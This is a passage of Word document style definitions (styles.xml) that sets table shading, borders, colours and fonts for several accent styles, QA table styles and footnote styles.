  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent4">
    <w:name w:val="Light Shading Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:locked/>
    <w:rsid w:val="002676A4"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="580E85" w:themeColor="accent4" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B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0B9F7" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E0B9F7" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QATableNumbersChar">
    <w:name w:val="QA Table Numbers Char"/>
    <w:basedOn w:val="QATableBodyChar"/>
    <w:link w:val="QATableNumbers"/>
    <w:rsid w:val="00D32E5D"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent3">
    <w:name w:val="Light Shading Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:locked/>
    <w:rsid w:val="000C7DAF"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:color w:val="128F20" w:themeColor="accent3" w:themeShade="BF"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B"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BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QATableHeadingWhite">
    <w:name w:val="QA Table Heading White"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="QATableHeadingWhiteChar"/>
    <w:rsid w:val="00501A43"/>
    <w:pPr>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:caps/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent4">
    <w:name w:val="Light List Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:locked/>
    <w:rsid w:val="00A152A1"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="7713B2" w:themeFill="accent4"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="7713B2" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00891D86"/>
    <w:rPr>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent2">
    <w:name w:val="Medium Grid 1 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:locked/>
    <w:rsid w:val="00621B5C"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0837F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0837F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent3">
    <w:name w:val="Medium Grid 1 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:locked/>
    <w:rsid w:val="00621B5C"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="7CEE89" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="7CEE89" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumShading1-Accent3">
    <w:name w:val="Medium Shading 1 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="63"/>
    <w:locked/>
    <w:rsid w:val="009647DE"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="18BF2B" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="3AE64E" w:themeColor="accent3" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00771A37"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00771A37"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Calibri" w:hAnsi="Arial" w:cs="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00771A37"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList2-Accent1">
    <w:name w:val="Medium List 2 Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="66"/>
    <w:locked/>
    <w:rsid w:val="00771A37"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00519C" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00519C" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00519C" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00519C" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="00519C" w:themeColor="accent1"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00519C"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519C" w:themeColor="accent1"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00519C"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A7D4FF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A7D4FF"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2-Accent6">
    <w:name w:val="Medium Grid 2 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="68"/>
    <w:locked/>
    <w:rsid w:val="00D22A0F"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="F08300" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="FFE0BC" w:themeFill="accent6" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="2E2D2C" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFF2E4" w:themeFill="accent6" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="2E2D2C" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="2E2D2C"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2E2D2C" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFE6C9" w:themeFill="accent6" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFC178" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="F08300" w:themeColor="accent6"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="F08300" w:themeColor="accent6"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFC178" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent3">
    <w:name w:val="Light List Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:locked/>
    <w:rsid w:val="00385438"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="18BF2B" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
